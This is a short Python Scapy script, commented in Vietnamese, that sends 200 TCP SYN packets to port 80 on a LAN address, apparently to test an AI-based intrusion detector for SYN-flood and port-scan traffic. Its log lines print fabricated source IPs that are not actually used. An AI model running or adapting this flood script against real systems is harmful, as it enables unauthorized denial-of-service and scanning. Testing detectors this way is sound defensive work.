from scapy.all import Ether, IP, TCP, sendp, send, conf
import time
import random

# Đặt IP đích là IP LAN của máy bạn
TARGET_IP = "172.26.23.136" 
TARGET_PORT = 80

print(f"🚀 Kích hoạt vũ khí Hacker [CHẾ ĐỘ RẢI RÁC - 5s/lần]: Bắn SYN vào {TARGET_IP}...")

card_mang = conf.iface
print(f"📡 Đang ép xung qua Card mạng vật lý: {card_mang.name}")

# Tổng cộng 200 cuộc tấn công
for i in range(200):
    fake_ip = f"192.168.2.{random.randint(1, 254)}"
    fake_port = random.randint(1024, 65535)
    
    # [ĐÃ ĐIỀU CHỈNH ĐỂ CHẠY QUA WIFI THỰC TẾ]
    # Bỏ src=fake_ip để dùng IP thật của máy bắn (Router sẽ không chặn nữa)
    # Tuy dùng IP thật nhưng chúng ta liên tục thay đổi Cổng nguồn (fake_port)
    # Hệ thống AI vẫn sẽ nhận diện đây là hành vi quét cổng / SYN Flood!
    packet = IP(dst=TARGET_IP) / TCP(sport=fake_port, dport=TARGET_PORT, flags="S")
    
    # Bắn gói tin ở Tầng 3 (Network Layer)
    send(packet, verbose=False)
    
    print(f" ☠️ [{i+1}/200] Đã bắn SYN từ IP: {fake_ip}:{fake_port}")
    
    # [ĐÃ ĐIỀU CHỈNH]: Dừng đúng 5 giây trước khi bắn phát tiếp theo
    if i < 199:
        time.sleep(5) 

print("✅ Đã hoàn thành toàn bộ 200 cuộc tấn công!")